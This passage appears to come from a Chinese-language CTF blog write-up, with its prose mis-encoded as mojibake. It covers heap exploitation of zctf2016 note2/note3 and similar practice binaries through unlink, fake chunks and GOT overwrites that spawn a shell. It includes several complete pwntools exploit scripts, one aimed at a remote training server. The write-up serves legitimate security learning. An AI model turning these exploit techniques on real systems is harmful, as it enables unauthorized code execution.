siè¿›å»å•æ­¥è°ƒè¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯è°ƒç”¨äº†_IO_file_doallocateå‡½æ•°ï¼Œç„¶åè¿™ä¸ªå‡½æ•°è°ƒç”¨äº†mallocã€‚_IO_file_doallocateçš„ä½œç”¨æ˜¯åˆ†é…è¾“å…¥ç¼“å†²åŒºã€‚å› æ­¤åŸå› ä¸ºprintfå…ˆå°†æ•°æ®è¾“å‡ºåˆ°ç¼“å†²åŒºä¸­ï¼Œç”±äºæœ€å¼€å§‹æ²¡æœ‰ç¼“å†²åŒºï¼Œå› æ­¤éœ€è¦ä½¿ç”¨mallocè¿›è¡Œç”³è¯·ã€‚å°†æ•°æ®å…ˆå­˜æ”¾åˆ°è¿™ä¸ªåˆšç”³è¯·çš„ç¼“å†²åŒºé‡Œï¼Œç­‰ç¢°è§fflushå‡½æ•°å†è¿›è¡Œè¾“å‡ºã€‚</p><h4 id="å¤§è‡´æ€è·¯"><a href="#å¤§è‡´æ€è·¯" class="headerlink" title="å¤§è‡´æ€è·¯"></a>å¤§è‡´æ€è·¯</h4><p>æ•´ä½“æ€è·¯ï¼Œåˆ©ç”¨æº¢å‡ºæ„é€ fake_chunkï¼Œç„¶åé‡Šæ”¾å¼•çº¿å †å—(å°±æ˜¯fake_chunkä¸‹é¢ï¼ˆé«˜åœ°å€ï¼‰çš„é‚£ä¸ªchunk)ï¼Œæ­¤æ—¶å·²ç»å¯ä»¥å»ä¿®æ”¹bssæ®µä¸Šå­˜å‚¨çš„chunkä¿¡æ¯ï¼Œç”±äºä¸èƒ½ç›´æ¥å¯»å€æ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€ã€‚å› æ­¤éœ€è¦å»ç”¨putsæ¥è¿›è¡Œå¯»å€æ³„éœ²ã€‚å…ˆå°†freeçš„gotåœ°å€æ”¹ä¸ºputsçš„pltåœ°å€ï¼Œå› ä¸ºä¼ ç»™putsçš„å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œç„¶åputså°±ä¼šè¿›è¡Œå¯»å€æ³„éœ²ï¼Œå› æ­¤åªè¦bssåœ°å€å­˜æ”¾çš„chunkåœ°å€æ”¹æˆputsçš„gotè¡¨ï¼Œç„¶åfreeæ‰è¿™ä¸ªä½ç½®çš„chunk(æ­¤æ—¶å·²ç»æ˜¯putsçš„gotè¡¨äº†ï¼Œè€Œä¸”freeè¢«åŠ«æŒæˆäº†puts),å°±å¯ä»¥æ³„éœ²å‡ºæ¥å‡½æ•°çš„çœŸå®åœ°å€äº†ã€‚ç„¶ååŒæ ·çš„æ‰‹æ³•ä¿®æ”¹freeçš„gotè¡¨ä¸ºsystemçš„åœ°å€å°±è¡Œï¼Œæœ€åfreeæ‰è£…æœ‰&#x2F;bin&#x2F;shçš„chunkå³å¯è·å–shellã€‚<br>toolsè¿™ä¸ªå‡½æ•°åº“çš„æºç åœ¨è¿™ <a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">here</a></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26316)</span></span><br><span class="line">debug(p,<span class="number">0x400B7A</span>,<span class="number">0x400A87</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x602150</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2 unlink</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#3 lead chunk</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#5 prevent merge</span></span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,fake_chunk)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got_addr)+p64(<span class="number">0</span>)+p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(puts_plt_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=long_search(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220625221902497-1011860752.png"></p><h3 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h3><h4 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h4><p><img src="/../img/2706180-20220625221916782-1505040812.png"></p><h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><p><img src="/../img/2706180-20220625221927065-1302076520.png"></p><p>æ¼æ´ç‚¹åœ¨è¿™é‡Œ,åœ¨æ¯”è¾ƒçš„æ—¶å€™ï¼Œæ‹¿äº†æ— ç¬¦å·æ•°å’Œæœ‰ç¬¦å·æ•°åšæ¯”è¾ƒï¼Œç¨‹åºä¼šè‡ªåŠ¨å°†å…¶è½¬åŒ–ä¸ºæ— ç¬¦å·æ•°æ¥åˆ¤æ–­ï¼Œä¹Ÿå°±æ˜¯a2æˆ‘ä»¬è¾“å…¥æˆ0ï¼Œé‚£å°±æ˜¯-1&gt;iï¼ŒæŠŠ-1è½¬åŒ–æˆæ— ç¬¦å·æ•°0xffffffffã€‚å› æ­¤è¾“å…¥çš„å†…å®¹å°±æˆäº†0xffffffffå­—èŠ‚çš„æ•°æ®ã€‚æ¯«æ— ç–‘é—®è¿™é‡Œå­˜åœ¨äº†æº¢å‡ºã€‚</p><p>ä¸è¿‡ç”±äºè¾“å…¥çš„æ˜¯0ï¼Œå› æ­¤mallocç”³è¯·chunkçš„æ—¶å€™ï¼Œè‡ªç„¶å°±ç”³è¯·äº†0x20å­—èŠ‚çš„chunkï¼ˆ0x10çš„chunkå¤´ï¼Œ0x10çš„æœ€å°ç”¨æˆ·ç©ºé—´ï¼‰</p><p>ä¸ºä»€ä¹ˆè¦å…ˆæè¿™é‡Œï¼Œéš¾é“editå‡½æ•°ä¸å­˜åœ¨æº¢å‡ºæ¼æ´ä¹ˆï¼Ÿä¸‹é¢åˆ†æä¸€ä¸‹ã€‚</p><p><img src="/../img/2706180-20220625222007500-1812777143.png"></p><p>è¿™é‡Œå°±è¦äº†ä¸ªç´¢å¼•ï¼Œç„¶åå°±å¯ä»¥å¾€é‡Œé¢è¾“å…¥æ•°æ®äº†ï¼Œæœ€å¤šèƒ½è¾“å…¥144å­—èŠ‚çš„æ•°æ®ã€‚ä¼¼ä¹åªè¦ç”³è¯·ä¸€ä¸ªå°ç‚¹çš„chunkï¼Œç”¨editä¹Ÿèƒ½æº¢å‡ºï¼Œç„¶åunlinkã€‚</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªåœ°æ–¹è¦æ³¨æ„åˆ°ï¼Œeditå‡½æ•°ç¡®å®å¯ä»¥æº¢å‡ºï¼Œä½†æ˜¯ä¼šè¢«00æˆªæ–­ï¼Œå› ä¸ºä¸‹é¢strlenå‡½æ•°ã€‚</p><p><img src="/../img/2706180-20220625222019802-1809134741.png"></p><p>è¿™é‡Œä¼¼ä¹çœ‹çš„æ˜¯å°†è¾“å…¥çš„æ•°æ®ä¸­%å»é™¤æ‰ï¼Œä½†æ˜¯åœ¨éå†çš„æ—¶å€™ï¼Œç”¨äº†strlenæ¥åˆ¤æ–­å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œå› æ­¤è¾“å…¥æ•°æ®å¦‚æœå‡ºç°äº†p64æ‰“åŒ…çš„å­—èŠ‚æµï¼Œå°±ä¼šå°†strlenæˆªæ–­ï¼Œä»è€Œæ‹·è´æ•°æ®å¤±è´¥ã€‚</p><p>å› æ­¤æƒ³é€šè¿‡æº¢å‡ºæ¥è¿›è¡Œunlinkï¼Œè¿˜è¦é€šè¿‡addå‡½æ•°çš„æº¢å‡ºã€‚</p><h4 id="å¤§è‡´æ€è·¯-1"><a href="#å¤§è‡´æ€è·¯-1" class="headerlink" title="å¤§è‡´æ€è·¯"></a>å¤§è‡´æ€è·¯</h4><p>å…ˆç”³è¯·ä¸‰ä¸ªchunkï¼Œç¬¬ä¸€ä¸ªå¤§å°æ— æ‰€è°“ï¼Œè®©å®ƒæ¥å­˜æ”¾fake_chunkï¼Œç„¶åç¬¬äºŒä¸ªchunkçš„å¤§å°è¦ä¸º0ï¼Œå› ä¸ºè¦æº¢å‡ºå®ƒï¼Œä½†æ˜¯ç”±äºç”¨æˆ·ç©ºé—´åªæœ‰0x10ï¼Œæ‰€ä»¥åªèƒ½å°†fake_chunkå¸ƒç½®åˆ°ä½åœ°å€çš„é‚£ä¸ªchunkï¼ˆå°±æ˜¯ç¬¬ä¸€ä¸ªchunkï¼‰ï¼Œç„¶ååˆ©ç”¨æº¢å‡ºï¼Œä¿®æ”¹ç¬¬ä¸‰ä¸ªchunkçš„prev_sizeå’Œsizeï¼Œå……å½“å¼•çº¿å †å—ã€‚å¼•çº¿å †å—çš„å¤§å°æ²¡çš„è¯´ï¼Œè¦å¤§äº0x80,å› ä¸ºä¸èƒ½è®©å®ƒfreeæ‰çš„æ—¶å€™è¿›å…¥åˆ°fastbiné‡Œé¢ã€‚</p><p>å‰©ä¸‹çš„å°±æ˜¯å¸¸è§„unlinkçš„æ“ä½œäº†ï¼Œå°†å¼•çº¿å †å—é‡Šæ”¾æ‰ï¼Œç„¶åfake_chunkçš„åœ°å€è¢«æ”¾åˆ°äº†bssæ®µä¸Šã€‚editç¼–è¾‘bssæ®µä¸Šå­˜æ”¾çš„chunkä¿¡æ¯ï¼Œç„¶åè¿›è¡Œæ³„éœ²å‡½æ•°çœŸå®åœ°å€å’Œç¯¡æ”¹gotè¡¨çš„æ“ä½œï¼Œæœ€ç»ˆè·å–shellã€‚</p><p>ä»¥è¿™é“é¢˜ä¸ºä¾‹ï¼ŒæŒ‡çš„ä¸€æçš„æ˜¯unlinkè¦é€šè¿‡æ£€æŸ¥ å°±è¦ä¼ªé€ &amp;fake_chunk-0x18 å’Œ &amp;fake_chunk-0x10 è€Œbssæ®µæ”¾çš„æ˜¯chunkçš„ç”¨æˆ·åœ°å€ï¼ˆè¿™ä¸ªç”¨æˆ·åœ°å€ä¹Ÿå°±æ˜¯æ­£å¸¸æƒ…å†µä¸‹fake_chunkæ‰€å¤„çš„åœ°å€)ï¼Œæ‰€ä»¥chunk 1çš„åœ°å€ä¸‹é¢çš„å†…å®¹æœ€å¼€å§‹å°±è¦æ˜¯ä¼ªé€ çš„&amp;fake_chunk-0x18 å’Œ &amp;fake_chunk-0x10ï¼Œè€Œä¸èƒ½å°†fake_chunkæ”¾åˆ°å…¶ä»–ä½ç½®ã€‚</p><h4 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27755)</span></span><br><span class="line"><span class="comment">#debug(p,0x400F4F)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 128)\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the note content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,choice,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;TheNewContents:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ptr=<span class="number">0x602120</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x50</span>,fake_chunk)</span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;ddddd&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(atoi_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)<span class="comment">#å‰é¢æ˜¯åƒåœ¾æ•°æ®ï¼ˆé0ï¼‰åé¢åªæœ‰è¿™ä¸€ä¸ªåœ°å€ï¼Œå› æ­¤åœ°å€ä¸­çš„00è¢«æˆªæ–­äº†ï¼Œä¹Ÿä¸å½±å“æ•°æ®æœ¬èº«</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=long_search(&#x27;atoi&#x27;,atoi_addr)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h3><h4 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h4><p><img src="/../img/2706180-20220625222036558-1667669742.png"></p><h4 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h4><p><img src="/../img/2706180-20220625222045970-1527119726.png"></p><p>æ¼æ´å’Œnote2ä¸€æ ·ï¼Œä¾æ—§æ‹¿ç€intç±»å‹å’Œunsigned intç±»å‹ä½œæ¯”è¾ƒï¼Œå¯¼è‡´-1å¯ä»¥å˜æˆä¸€ä¸ªå¾ˆå¤§çš„æ•´æ•°ï¼Œä»è€Œå¯¼è‡´è¾“å…¥äº§ç”Ÿäº†æº¢å‡ºã€‚</p><p>ç„¶åè¿™é“é¢˜çš„showå‡½æ•°ï¼Œæ— æ³•ä½¿ç”¨ï¼Œå°±å¯¼è‡´äº†æ³„éœ²ä¸æ˜¯é‚£ä¹ˆèˆ’æœã€‚</p><h4 id="å¤§è‡´æ€è·¯-2"><a href="#å¤§è‡´æ€è·¯-2" class="headerlink" title="å¤§è‡´æ€è·¯"></a>å¤§è‡´æ€è·¯</h4><p>ç„¶åå¸¸è§„unlinkçš„æ‰‹æ®µï¼Œè·Ÿnote2çš„æ‰‹æ³•ä¸€æ ·ï¼Œå°±ä¸å†èµ˜è¿°ã€‚</p><p>unlinkä¹‹åï¼Œè¦æ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€ã€‚å…ˆå°†freeå‡½æ•°çš„gotè¡¨æ”¹ä¸ºputsçš„pltåœ°å€ï¼Œç„¶åå†æŠŠbssæ®µå­˜æ”¾çš„chunkåœ°å€æ”¹æˆputsçš„gotåœ°å€ï¼Œæ‰§è¡Œfreeè¿›è¡Œæ³„éœ²ã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¾“å…¥çš„æ•°æ®æœ€åä¼šè¢«åŠ ä¸Š00ï¼Œè¿™é“é¢˜freeçš„gotè¡¨å’Œputsçš„gotè¡¨æ˜¯æŒ¨ç€çš„ï¼Œå¦‚æœæŠŠp64æ‰“åŒ…çš„æ•°æ®ç»™freeåï¼Œæœ€ååŠ ä¸Šçš„00ä¼šè¦†ç›–putsçš„çœŸå®çš„æœ€ä½å­—èŠ‚ã€‚å¯¼è‡´putsæ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œç¨‹åºä¼šå´©æºƒã€‚</p><p>å› æ­¤å‘é€p64æ‰“åŒ…çš„åœ°å€æ—¶ï¼Œéœ€è¦ç”¨åˆ‡ç‰‡å¤„ç†ä¸€ä¸‹ï¼Œå‘é€7ä¸ªå­—èŠ‚å³å¯ï¼ŒåŠ ä¸Š\nå…«å­—èŠ‚ï¼Œç„¶åç¨‹åºä¼šå°†\næ¢æˆ00ï¼Œå› æ­¤ä¸ä¼šå¹²æ‰°åˆ°putsçš„çœŸå®åœ°å€ã€‚</p><p><a href="(https://www.cnblogs.com/ZIKH26/articles/16307343.html)">toolsæºç </a></p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400BB9)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 1024)\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the note content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the new content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020C8</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>,fake_chunk)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x60</span>)+p64(<span class="number">0x90</span>)<span class="comment">#fake_chunk</span></span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">&#x27;1&#x27;</span>)<span class="comment">#overflow_chunk</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#lead_chunk</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#par_chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got_addr)+p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">payload=p64(puts_plt_addr)[:<span class="number">7</span>]</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">edit(<span class="number">0</span>,p64(sys_addr)[:<span class="number">7</span>])</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220625222103836-1038592504.png"></p><h3 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h3><h4 id="ä¿æŠ¤ç­–ç•¥ï¼š-2"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-2" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h4><p><img src="/../img/image-20221007182429275.png" alt="image-20221007182429275"></p><h4 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h4><p><img src="/../img/image-20221007182443910.png" alt="image-20221007182443910"></p><p>bannerå‡½æ•°é‡Œé¢å­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæ ¹æ®ä»¥å¾€çš„ç»éªŒï¼Œé€šå¸¸å †+æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„é¢˜ç›®ä¸­ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´éƒ½èµ·åˆ°ä¸€ä¸ªæ³„éœ²åœ°å€çš„ä½œç”¨ã€‚å› ä¸ºå­˜åœ¨è¿™ä¸ªæ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç›¸å½“äºæœ‰äº†libcåŸºåœ°å€ï¼Œç¨‹åºåŸºåœ°å€ã€‚</p><p><img src="/../img/image-20221007182456742.png" alt="image-20221007182456742"></p><p>get_inputå‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªoff_by_oneæ¼æ´ã€‚ç”±äºæˆ‘ä»¬æœ‰ç¨‹åºåŸºåœ°å€ï¼Œæ‰€ä»¥å°±èƒ½æ‹¿åˆ°bssæ®µä¸Šå­˜å‚¨chunkä¿¡æ¯çš„åœ°å€ï¼Œå°±å¯ä»¥æ‰“unlink(è¿™é“é¢˜æˆ‘æœ€å¼€å§‹è€ƒè™‘çš„æ˜¯off by one+double free+fastbin attackï¼Œä¸è¿‡åœ¨æ„é€ çš„æ—¶å€™æƒ³èµ·æ¥äº†ï¼Œè¿™é“é¢˜é‡Šæ”¾çš„å †å—è¿›å…¥ä¸åˆ°fastbinä¸­)</p><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><p>æ•´ä½“æ¥è¯´å°±æ˜¯ä¸€ä¸ªæ 